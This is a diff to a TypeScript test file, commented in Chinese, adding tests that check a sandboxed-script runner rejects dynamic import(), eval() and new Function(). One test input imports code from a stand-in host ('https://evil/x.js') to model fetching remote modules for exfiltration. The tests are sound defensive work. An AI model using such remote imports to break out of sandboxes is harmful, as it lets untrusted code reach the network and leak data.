@@ -185,6 +185,14 @@ export async function run(ctx: TestCtx): Promise<void> {
     // 脚本过长 → SCRIPT_TOO_LARGE(不跑 Worker,纯长度校验)
     r = await invoke(t['eval_script'], { script: 'x'.repeat(9000) })
     assert(/SCRIPT_TOO_LARGE/.test(r), 'eval_script: 脚本过长 → SCRIPT_TOO_LARGE')
+    // 安全审查 CRITICAL:runSandboxedScript 入口静态扫描拒绝 动态 import()/eval()/Function()(防沙箱拉外网模块外泄;命中即 return error 不创建 Worker,node 可测)
+    const { runSandboxedScript } = await import('../../tools/dataSlotQuery')
+    const fb1 = await runSandboxedScript({ x: 1 }, 'return import("https://evil/x.js")')
+    assert(fb1.ok === false && /禁用模式/.test(fb1.error || ''), '✓ runSandboxedScript 静态扫描拒绝动态 import()(防外网模块)')
+    const fb2 = await runSandboxedScript({ x: 1 }, 'return eval("1+1")')
+    assert(fb2.ok === false && /禁用模式/.test(fb2.error || ''), '✓ runSandboxedScript 静态扫描拒绝 eval()')
+    const fb3 = await runSandboxedScript({ x: 1 }, 'return new Function("x","return x")()')
+    assert(fb3.ok === false && /禁用模式/.test(fb3.error || ''), '✓ runSandboxedScript 静态扫描拒绝 new Function()')
   }
 
   // ============ read/write 高层工具(单主对象 + 自动锁 + 拦截器)============
